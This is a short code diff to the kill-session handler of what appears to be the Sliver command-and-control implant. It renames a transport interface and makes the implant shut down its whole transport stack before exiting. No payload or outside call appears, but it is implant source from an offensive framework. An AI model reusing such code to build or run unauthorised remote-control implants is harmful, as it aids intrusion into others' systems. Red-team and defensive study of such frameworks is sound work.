@@ -23,9 +23,9 @@ package handlers
 import (
 	"os"
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
 	"google.golang.org/protobuf/proto"
+
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
 var specialHandlers = map[uint32]TransportHandler{
@@ -37,13 +37,13 @@ func GetSpecialHandlers() map[uint32]TransportHandler {
 	return specialHandlers
 }
 
-// C2 - A small interface allowing us to
-// close the C2 channel when killing the implant
-type C2 interface {
-	Stop() error
+// c2 - A small interface allowing us to control
+// the transports stack when killing the implant.
+type c2 interface {
+	Shutdown() error
 }
 
-func killHandler(data []byte, transport C2) error {
+func killHandler(data []byte, transports c2) error {
 	killReq := &sliverpb.KillSessionReq{}
 	err := proto.Unmarshal(data, killReq)
 	// {{if .Config.Debug}}
@@ -52,10 +52,15 @@ func killHandler(data []byte, transport C2) error {
 	if err != nil {
 		return err
 	}
-	// Cleanup connection
-	if transport != nil {
-		transport.Stop()
+
+	// Shutdown the complete transport stack
+	if transports != nil {
+		err = transports.Shutdown()
+		if err != nil {
+			print("Error shuting down transports: %s", err)
+		}
 	}
+
 	// {{if .Config.Debug}}
 	println("Let's exit!")
 	// {{end}}
